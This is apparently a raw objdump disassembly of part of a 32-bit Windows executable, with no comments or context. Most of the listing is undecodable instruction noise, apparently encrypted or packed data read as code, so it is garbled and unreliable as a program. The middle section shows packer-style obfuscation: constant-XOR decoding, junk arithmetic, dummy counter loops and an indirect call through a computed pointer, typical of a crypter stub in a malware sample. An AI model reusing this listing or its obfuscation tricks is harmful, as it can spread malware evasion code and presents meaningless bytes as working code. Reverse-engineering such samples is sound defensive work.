  40cca3:	int3   
  40cca4:	xor    al,0x6f
  40cca6:	mov    edi,0x7961b766
  40ccab:	pop    ebx
  40ccac:	cmc    
  40ccad:	adc    DWORD PTR [ecx-0x71],ecx
  40ccb0:	bound  ebx,QWORD PTR [ecx-0x7ebae4b8]
  40ccb6:	es dec eax
  40ccb8:	push   cs
  40ccb9:	adc    al,BYTE PTR [esi-0x2e6ac736]
  40ccbf:	ret    0x7393
  40ccc2:	push   ss
  40ccc3:	mov    esi,0xeb596f85
  40ccc8:	outs   dx,DWORD PTR ds:[esi]
  40ccc9:	rol    DWORD PTR [ebx-0x42],0x15
  40cccd:	cs fdivp st(0),st
  40ccd0:	sub    BYTE PTR [esi],bh
  40ccd2:	push   esi
  40ccd3:	int    0x2e
  40ccd5:	and    BYTE PTR [ebx+0x4e2212fd],dh
  40ccdb:	xchg   BYTE PTR [esi+0xbb4c799],ah
  40cce1:	stc    
  40cce2:	pop    esp
  40cce3:	popf   
  40cce4:	push   eax
  40cce5:	int3   
  40cce6:	nop
  40cce7:	shl    BYTE PTR [ebx-0x7f6d16e3],1
  40cced:	push   edx
  40ccee:	in     eax,dx
  40ccef:	mov    WORD PTR [esi+eax*1+0x7281c580],es
  40ccf6:	push   0xffffff9b
  40ccf8:	add    eax,eax
  40ccfa:	push   esi
  40ccfb:	add    al,0x48
  40ccfd:	test   eax,edi
  40ccff:	add    eax,0x165fdb50
  40cd04:	clc    
  40cd05:	into   
  40cd06:	(bad)  
  40cd07:	adc    eax,0x5ab79571
  40cd0c:	mov    dl,0x6b
  40cd0e:	rcr    DWORD PTR [ecx+0x4e991363],1
  40cd14:	or     edi,edi
  40cd16:	cmp    cl,ch
  40cd18:	ds push ebp
  40cd1a:	push   ebx
  40cd1b:	cmp    eax,0xa2e54d64
  40cd20:	inc    ecx
  40cd21:	lahf   
  40cd22:	rcl    ebx,1
  40cd24:	mov    BYTE PTR [ebx+0x27],0xee
  40cd28:	jp     0x40cd1e
  40cd2a:	dec    esi
  40cd2b:	mov    BYTE PTR [edx-0x46],bl
  40cd2e:	add    DWORD PTR [edi-0x3b],edi
  40cd31:	repnz mov bh,0xdd
  40cd34:	pop    ss
  40cd35:	in     eax,0xaf
  40cd37:	inc    ebp
  40cd38:	mov    ds:0xdad77e2f,al
  40cd3d:	or     ebx,DWORD PTR ds:0xd5d2fe8f
  40cd43:	inc    dx
  40cd45:	lock mov dh,0x11
  40cd48:	sbb    al,0xbd
  40cd4a:	mov    ecx,0x2b5abfde
  40cd4f:	or     DWORD PTR [edi+0x5494f54e],ecx
  40cd55:	fldcw  WORD PTR [esi+0x37]
  40cd58:	lods   eax,DWORD PTR ds:[esi]
  40cd59:	jnp    0x40cce6
  40cd5b:	rcl    BYTE PTR [ecx],1
  40cd5d:	stc    
  40cd5e:	cmp    edi,DWORD PTR [ebp+0x18eec41]
  40cd64:	pop    ss
  40cd65:	sub    edi,DWORD PTR ds:0x863edc5
  40cd6b:	sub    DWORD PTR [eax+0x4c],edx
  40cd6e:	dec    ecx
  40cd6f:	loopne 0x40cd3d
  40cd71:	data16 jge 0x40cd4f
  40cd74:	fs loop 0x40cd98
  40cd77:	cmp    dl,BYTE PTR ds:0xac3c719a
  40cd7d:	js     0x40cd83
  40cd7f:	fdivr  DWORD PTR [edi]
  40cd81:	outs   dx,BYTE PTR ds:[esi]
  40cd82:	xchg   ebx,eax
  40cd83:	mov    dl,0xe
  40cd85:	ss mov ah,0x5e
  40cd88:	or     eax,0x82345418
  40cd8d:	mov    dl,BYTE PTR [eax+0x5ca24e59]
  40cd93:	xchg   ebx,eax
  40cd94:	and    eax,0x2d44b10e
  40cd99:	or     ch,BYTE PTR [eax+0x529bf1af]
  40cd9f:	retf   0x1c77
  40cda2:	dec    ecx
  40cda3:	mov    ecx,0x94f7b719
  40cda8:	clc    
  40cda9:	and    esi,esi
  40cdab:	(bad)  
  40cdac:	scas   eax,DWORD PTR es:[edi]
  40cdad:	push   ds
  40cdae:	in     al,0x8c
  40cdb0:	(bad)  
  40cdb1:	mov    esp,0x13337e1d
  40cdb6:	dec    edi
  40cdb7:	test   edx,ebp
  40cdb9:	in     eax,0x98
  40cdbb:	mov    dh,0x85
  40cdbd:	inc    edx
  40cdbe:	mov    edx,0x6608ade7
  40cdc3:	ins    BYTE PTR es:[edi],dx
  40cdc4:	mov    al,es:0xbf621b5f
  40cdca:	ins    DWORD PTR es:[edi],dx
  40cdcb:	mov    eax,0x848998af
  40cdd0:	sbb    dh,BYTE PTR [ecx]
  40cdd2:	stc    
  40cdd3:	or     BYTE PTR ds:0xfa4eb8da,dl
  40cdd9:	test   BYTE PTR [edi-0x7f3fee68],bh
  40cddf:	sub    BYTE PTR [edx],bl
  40cde1:	mov    cl,0xad
  40cde3:	inc    esp
  40cde4:	jbe    0x40cde8
  40cde6:	add    bh,BYTE PTR [eax+eax*2+0xadd0fed]
  40cded:	mov    edx,0x3e1e9731
  40cdf2:	daa    
  40cdf3:	outs   dx,DWORD PTR ds:[esi]
  40cdf4:	push   esp
  40cdf5:	retf   0xb395
  40cdf8:	pusha  
  40cdf9:	outs   dx,BYTE PTR ds:[esi]
  40cdfa:	in     eax,0xff
  40cdfc:	ins    DWORD PTR es:[edi],dx
  40cdfd:	call   0x91fe:0x20edee85
  40ce04:	push   eax
  40ce05:	aas    
  40ce06:	dec    eax
  40ce07:	dec    esp
  40ce08:	aaa    
  40ce09:	jns    0x40ce06
  40ce0b:	pop    ebp
  40ce0c:	pop    ss
  40ce0d:	fcmovne st,st(2)
  40ce0f:	adc    esp,DWORD PTR [esi-0x54e99801]
  40ce15:	add    eax,0xcc59e586
  40ce1a:	inc    edx
  40ce1b:	call   0x4e044d89
  40ce20:	dec    esi
  40ce21:	inc    ebp
  40ce22:	xchg   edx,eax
  40ce23:	(bad)  
  40ce24:	call   0xfd1b48ab
  40ce29:	scas   al,BYTE PTR es:[edi]
  40ce2a:	cwde   
  40ce2b:	outs   dx,BYTE PTR ds:[esi]
  40ce2c:	and    BYTE PTR [edx-0x3d6851fb],cl
  40ce32:	popf   
  40ce33:	clc    
  40ce34:	xor    esp,DWORD PTR [ebp+0x48]
  40ce37:	loope  0x40ce4c
  40ce39:	or     DWORD PTR [ecx-0x266b5949],edi
  40ce3f:	mov    ebp,DWORD PTR [ecx+0x2fbc07aa]
  40ce45:	dec    eax
  40ce46:	popa   
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c16
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42389a
  40cf91:	push   0x423852
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a36
  40cff7:	mov    ebx,DWORD PTR ds:0x421a5e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c16
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421c9a
  40d0ed:	mov    esi,DWORD PTR ds:0x421c92
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421c92,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	push   ecx
  40d112:	xchg   ebx,eax
  40d113:	mov    ah,BYTE PTR [ebx+0x6262d1c2]
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x45]
  40d11e:	jle    0x40d0bf
  40d120:	bound  esi,QWORD PTR [esi]
  40d122:	inc    ebx
  40d123:	add    al,0xe9
  40d125:	mov    ds:0x3a52d898,eax
  40d12a:	rcl    BYTE PTR [ebx+0x21],0x15
  40d12e:	mov    ch,BYTE PTR ds:[edx-0x4a]
  40d132:	scas   eax,DWORD PTR es:[edi]
  40d133:	add    DWORD PTR [edi-0x48d459a0],ebp
  40d139:	push   es
  40d13a:	in     al,dx
  40d13b:	mov    ecx,0xb594e0c9
  40d140:	and    esi,esi
  40d142:	sub    DWORD PTR [ebx+0x1727a027],edx
  40d148:	arpl   WORD PTR [ebx-0xc],si
  40d14b:	bound  eax,QWORD PTR [esi]
  40d14d:	mov    dh,0x92
  40d14f:	fisubr WORD PTR [esi+0x0]
  40d152:	sahf   
  40d153:	sub    DWORD PTR [ecx+ecx*4+0x72],edi
  40d157:	jbe    0x40d192
  40d159:	inc    esp
  40d15a:	test   al,0xe3
  40d15c:	int    0xdf
  40d15e:	pop    eax
  40d15f:	addr16 pop es
  40d161:	imul   eax,DWORD PTR [ebx+0x54],0xffffffdd
  40d165:	push   edx
  40d166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d167:	lahf   
  40d168:	xchg   esp,eax
  40d169:	int3   
  40d16a:	sbb    cl,BYTE PTR [esi+0x8]
  40d16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16e:	leave  
  40d16f:	gs ret 
  40d171:	lea    eax,[ecx-0x4ad1cd6d]
  40d177:	sbb    al,0x58
  40d179:	test   al,bh
  40d17b:	aas    
  40d17c:	xlat   BYTE PTR ds:[ebx]
  40d17d:	mov    dl,0xf6
  40d17f:	outs   dx,DWORD PTR ds:[esi]
  40d180:	mov    ds,WORD PTR [ebp-0x48]
  40d183:	mov    esi,0x475fa3b3
  40d188:	(bad)  
  40d189:	pop    edx
  40d18a:	mov    cl,0x18
  40d18c:	imul   eax,DWORD PTR [edx],0x40ae1f90
  40d192:	add    bh,cl
  40d194:	xchg   ecx,eax
  40d195:	clc    
  40d196:	inc    esi
  40d197:	mov    DWORD PTR [esp+ecx*2+0x5ae8bf63],eax
  40d19e:	les    eax,FWORD PTR [edi]
  40d1a0:	jecxz  0x40d137
  40d1a2:	mov    al,ds:0x4cf92db9
  40d1a7:	inc    esi
  40d1a8:	mov    eax,0xf089fdf3
  40d1ad:	mov    WORD PTR [ebx-0x7],ss
  40d1b0:	jp     0x40d211
  40d1b2:	xor    ebx,0xffffff9d
  40d1b5:	jmp    0x40d1a0
  40d1b7:	dec    esi
  40d1b8:	sbb    esp,esi
  40d1ba:	int    0xb2
  40d1bc:	(bad)  
  40d1bd:	cmc    
  40d1be:	je     0x40d194
  40d1c0:	sub    al,0xe0
  40d1c2:	and    DWORD PTR [edx],0x2a
  40d1c5:	hlt    
  40d1c6:	aad    0x8c
  40d1c8:	loopne 0x40d1b0
  40d1ca:	or     eax,edi
  40d1cc:	add    DWORD PTR [edx+0x1e],esp
  40d1cf:	dec    ebp
  40d1d0:	mov    al,0x35
  40d1d2:	xor    al,0x96
  40d1d4:	mov    ecx,0xc76f22d8
  40d1d9:	int3   
  40d1da:	dec    esp
  40d1db:	sahf   
  40d1dc:	lods   al,BYTE PTR ds:[esi]
  40d1dd:	stos   DWORD PTR es:[edi],eax
  40d1de:	out    dx,eax
  40d1df:	pop    esi
  40d1e0:	lds    ebx,FWORD PTR [ebp+0x1e]
  40d1e3:	cli    
  40d1e4:	and    DWORD PTR ds:0x2a2093f,ecx
  40d1ea:	add    ebx,DWORD PTR [ebp-0x7c]
  40d1ed:	gs scas eax,DWORD PTR es:[edi]
  40d1ef:	pop    esi
  40d1f0:	adc    DWORD PTR [ecx-0x62a27fa],ecx
  40d1f6:	ror    BYTE PTR [edx+0x3e2c6025],0x4
  40d1fd:	je     0x40d225
  40d1ff:	mov    edi,0xa28ad1b
  40d204:	xchg   ebx,eax
  40d205:	ret    0xb25a
  40d208:	mov    ebx,0xc586286e
  40d20d:	adc    ebp,ebp
  40d20f:	pop    ebp
  40d210:	loope  0x40d251
  40d212:	xchg   esi,eax
  40d213:	push   es
  40d214:	sbb    ebx,eax
  40d216:	outs   dx,BYTE PTR ds:[esi]
  40d217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d218:	cmp    BYTE PTR [ebx-0x65],bl
  40d21b:	cwde   
  40d21c:	adc    eax,0xe3d3e74e
  40d221:	out    0xcc,al
  40d223:	xor    al,0x10
  40d225:	sbb    DWORD PTR [edx+0x38],0x29
  40d229:	clc    
  40d22a:	pop    ss
  40d22b:	add    esi,DWORD PTR [esi]
  40d22d:	cli    
  40d22e:	loope  0x40d20a
  40d230:	and    esp,DWORD PTR [edi]
  40d232:	mov    esi,0x4610b6eb
  40d237:	sahf   
  40d238:	je     0x40d29e
  40d23a:	push   edx
  40d23b:	ror    BYTE PTR [ebx+0x32],1
  40d23e:	push   esp
  40d23f:	enter  0xf443,0xe8
  40d243:	out    dx,al
  40d244:	pop    ebp
  40d245:	ja     0x40d223
  40d247:	fisub  WORD PTR [edi-0x2f]
  40d24a:	sub    eax,0x3be974b9
  40d24f:	adc    ah,0xdb
  40d252:	xchg   ebx,eax
  40d253:	add    ebx,DWORD PTR [ebx*1-0x7e4afd4b]
  40d25a:	inc    esp
  40d25b:	ret    
  40d25c:	scas   al,BYTE PTR es:[edi]
  40d25d:	test   dl,cl
  40d25f:	sbb    al,0x38
  40d261:	mov    BYTE PTR [ebp+0x1f],ah
  40d264:	mov    al,ds:0x6fa27c5b
  40d269:	scas   eax,DWORD PTR es:[edi]
  40d26a:	daa    
  40d26b:	add    ch,dl
  40d26d:	pop    edi
  40d26e:	stc    
  40d26f:	jmp    0x1fecf9f5
  40d274:	rcl    DWORD PTR [eax+0x4c120698],1
  40d27a:	fdiv   DWORD PTR [ebx]
  40d27c:	pop    ss
  40d27d:	mov    ds:0xcf9e7454,eax
  40d282:	outs   dx,BYTE PTR ds:[esi]
  40d283:	xor    BYTE PTR [ebx+0x20db90b2],dh
  40d289:	inc    esi
  40d28a:	push   es
  40d28b:	call   DWORD PTR [esi-0x62]
  40d28e:	dec    edx
  40d28f:	adc    bl,BYTE PTR [edi+eiz*1]
  40d292:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40d294:	mov    ch,0xb9
  40d296:	ret    
  40d297:	(bad)  
  40d298:	fbstp  TBYTE PTR [edi]
  40d29a:	scas   eax,DWORD PTR es:[edi]
  40d29b:	mov    ebp,0xb285b1f0
  40d2a0:	push   0x7
  40d2a2:	xor    BYTE PTR [ecx+0x40],0xf7
  40d2a6:	xor    eax,0x226f926d
  40d2ab:	add    dl,BYTE PTR [edi+esi*4-0x757e02b1]
  40d2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2b3:	mov    ch,0x43
  40d2b5:	jl     0x40d302
  40d2b7:	and    eax,0x72d32686
  40d2bc:	mov    esi,0x2c226806
  40d2c1:	inc    ecx
  40d2c2:	scas   eax,DWORD PTR es:[edi]
  40d2c3:	inc    DWORD PTR [ecx+ecx*2]
  40d2c6:	ret    
  40d2c7:	xchg   edx,eax
  40d2c8:	add    ebp,DWORD PTR [edi-0x167bf2db]
  40d2ce:	jle    0x40d25a
  40d2d0:	stos   BYTE PTR es:[edi],al
  40d2d1:	lea    edi,[esi-0x2f970534]
  40d2d7:	imul   edi,edx,0xffffffb8
  40d2da:	das    
  40d2db:	add    edx,esp
  40d2dd:	ss hlt 
  40d2df:	push   cs
  40d2e0:	xchg   edx,eax
  40d2e1:	test   eax,0xfc3bef67
  40d2e6:	dec    esi
  40d2e7:	sbb    eax,0xe610d3c8
  40d2ec:	inc    BYTE PTR [edx-0x117aa086]
  40d2f2:	jle    0x40d2b5
  40d2f4:	pop    esi
  40d2f5:	push   ecx
  40d2f6:	sub    ebp,DWORD PTR [edi-0x4375dcda]
  40d2fc:	xor    BYTE PTR [ebp-0x46],al
  40d2ff:	pop    esp
  40d300:	das    
  40d301:	mov    WORD PTR [ecx],es
  40d303:	repnz int3 
  40d305:	push   ebx
  40d306:	mov    dl,BYTE PTR [ebp-0x7fd13514]
  40d30c:	or     eax,0x6be05075
  40d311:	inc    esp
  40d312:	cld    
  40d313:	loope  0x40d37d
  40d315:	rcr    DWORD PTR [edx+0x36],cl
  40d318:	ins    DWORD PTR es:[edi],dx
  40d319:	dec    ebp
  40d31a:	xchg   esp,eax
  40d31b:	out    0x87,al
  40d31d:	cmp    eax,0xca3c9774
  40d322:	adc    ebx,ebp
  40d324:	adc    al,0x51
  40d326:	xchg   esi,eax
  40d327:	arpl   cx,di
  40d329:	xor    esi,DWORD PTR [ecx-0x1fe2fda4]
  40d32f:	outs   dx,BYTE PTR ds:[esi]
  40d330:	lahf   
  40d331:	nop
  40d332:	(bad)  
  40d333:	out    0x2,eax
  40d335:	lods   ax,WORD PTR ds:[esi]
  40d337:	leave  
  40d338:	hlt    
  40d339:	je     0x40d3a9
  40d33b:	lods   eax,DWORD PTR ds:[si]
  40d33d:	retf   0xf6c
  40d340:	adc    esp,edi
  40d342:	mov    ds:0xf61f80f8,al
  40d347:	mov    ebp,0x38f09f24
  40d34c:	mov    edx,0xa13458c
  40d351:	xchg   ebp,eax
  40d352:	(bad)  
  40d353:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d355:	dec    DWORD PTR [eax+0x2aef561f]
  40d35b:	or     ah,BYTE PTR [ebx+0x4447d225]
  40d361:	scas   al,BYTE PTR es:[edi]
  40d362:	addr16 jno 0x40d350
  40d365:	cmp    bh,BYTE PTR [ebx]
  40d367:	test   al,0x5a
  40d369:	popa   
  40d36a:	ss pop ebp
  40d36c:	inc    esi
  40d36d:	pop    ebx
  40d36e:	imul   edi,DWORD PTR [esi+0x3d],0xffffffcf
  40d372:	inc    ebp
  40d373:	jns    0x40d325
  40d375:	mov    bl,0x21
  40d377:	cld    
  40d378:	push   eax
  40d379:	push   ds
  40d37a:	je     0x40d3cd
  40d37c:	dec    ebx
  40d37d:	sar    BYTE PTR [edi],1
  40d37f:	(bad)  
  40d380:	pusha  
  40d381:	mov    bh,0x55
  40d383:	loope  0x40d359
  40d385:	fisttp DWORD PTR [ebx+0x42]
  40d388:	out    dx,al
  40d389:	stos   BYTE PTR es:[edi],al
  40d38a:	dec    ebp
  40d38b:	shl    eax,cl
  40d38d:	add    esi,DWORD PTR [ebx+esi*2-0x73214a9f]
  40d394:	push   ecx
  40d395:	add    eax,0x2f758b09
  40d39a:	xchg   BYTE PTR [edx],bl
  40d39c:	jle    0x40d39a
  40d39e:	sahf   
  40d39f:	jo     0x40d384
  40d3a1:	call   0x32e9af8a
  40d3a6:	dec    ebp
  40d3a7:	mov    ebx,DWORD PTR [ebp-0x89c31ae]
  40d3ad:	sub    esp,eax
  40d3af:	xor    DWORD PTR [eax+eax*4-0xc976a0f],edi
  40d3b6:	aam    0x4e
  40d3b8:	pop    es
  40d3b9:	jmp    0x7f3c:0xe9643251
  40d3c0:	push   edi
  40d3c1:	push   ecx
  40d3c2:	cmp    edi,DWORD PTR [eax-0x130429d0]
  40d3c8:	call   0xdc71cfc5
  40d3cd:	ss in  eax,dx
  40d3cf:	adc    dl,dl
  40d3d1:	out    dx,al
  40d3d2:	xchg   esp,eax
  40d3d3:	xor    bh,BYTE PTR [ecx]
  40d3d5:	hlt    
  40d3d6:	test   BYTE PTR [esi],cl
  40d3d8:	jmp    0x40636ac3
  40d3dd:	mov    ds:0xa4b778b4,eax
  40d3e2:	push   ds
  40d3e3:	mov    eax,ds:0x51d540ab
  40d3e8:	fnstenv [ebx]
  40d3ea:	sub    BYTE PTR [edi],al
  40d3ec:	fsub   DWORD PTR [ebp+0x6b]
  40d3ef:	out    0x6c,eax
  40d3f1:	in     al,dx
  40d3f2:	repnz scas al,BYTE PTR es:[edi]
  40d3f4:	fmul   DWORD PTR ds:0x928923f4
  40d3fa:	sti    
  40d3fb:	cli    
  40d3fc:	jo     0x40d382
  40d3fe:	sub    al,0x55
  40d400:	(bad)  [eax+ebx*1-0x344d642c]
  40d407:	sahf   
  40d408:	nop
  40d409:	sbb    al,0xd7
  40d40b:	retf   0x2b58
  40d40e:	test   BYTE PTR [edi],ah
  40d410:	aam    0xed
  40d412:	pop    ebp
  40d413:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40d415:	sub    bh,BYTE PTR [ebx+0x2d]
  40d418:	mov    ds:0x928aa3cf,al
  40d41d:	push   cs
  40d41e:	or     BYTE PTR [ebp-0x6ffe3832],ah
  40d424:	or     BYTE PTR [edi+0x54fe8a21],dh
  40d42a:	sbb    al,dl
  40d42c:	mov    ebp,DWORD PTR [ecx]
  40d42e:	les    esp,FWORD PTR [edi-0x3d]
  40d431:	in     al,0xd3
  40d433:	cmc    
  40d434:	dec    esi
  40d435:	adc    ebx,DWORD PTR [ecx+0x23f0d201]
  40d43b:	outs   dx,BYTE PTR ss:[esi]
  40d43d:	push   cs
  40d43e:	xchg   esi,eax
  40d43f:	das    
  40d440:	inc    edi
  40d441:	push   ebp
  40d442:	cmp    eax,0x7027d688
  40d447:	push   ds
  40d448:	test   eax,0x74cca02
  40d44d:	jl     0x40d41b
  40d44f:	push   0x6e7b113b
  40d454:	js     0x40d432
  40d456:	ds jecxz 0x40d44e
  40d459:	mov    bl,BYTE PTR [ecx-0x1565aeac]
  40d45f:	mov    ds:0xec4f3977,al
  40d464:	sub    ebx,DWORD PTR [edx]
  40d466:	enter  0xdcae,0xd0
  40d46a:	pop    edi
  40d46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d46c:	push   0x9a1bd508
  40d471:	cmp    edx,ecx
  40d473:	ss xor ecx,esi
  40d476:	or     BYTE PTR [edi+ebx*1+0x79],dh
  40d47a:	jmp    0x37c4:0x34cb4a64
  40d481:	or     bl,al
  40d483:	dec    ecx
  40d484:	data16 xor al,0x9a
  40d487:	fistp  QWORD PTR [esp+ecx*4+0x4eba65f7]
  40d48e:	bound  ebx,QWORD PTR [ebp-0x78]
  40d491:	sahf   
  40d492:	xchg   edi,eax
  40d493:	repz sbb cl,bh
  40d496:	(bad)  
  40d497:	pop    esp
  40d498:	loop   0x40d4c6
  40d49a:	stos   BYTE PTR es:[edi],al
  40d49b:	pushf  
  40d49c:	or     ebp,ebx
  40d49e:	ins    BYTE PTR es:[edi],dx
  40d49f:	(bad)  
  40d4a0:	pop    ss
  40d4a1:	mov    esi,DWORD PTR [esi+0x4c63e8f5]
  40d4a7:	dec    ecx
  40d4a8:	mov    ebx,0x65fcd5e9
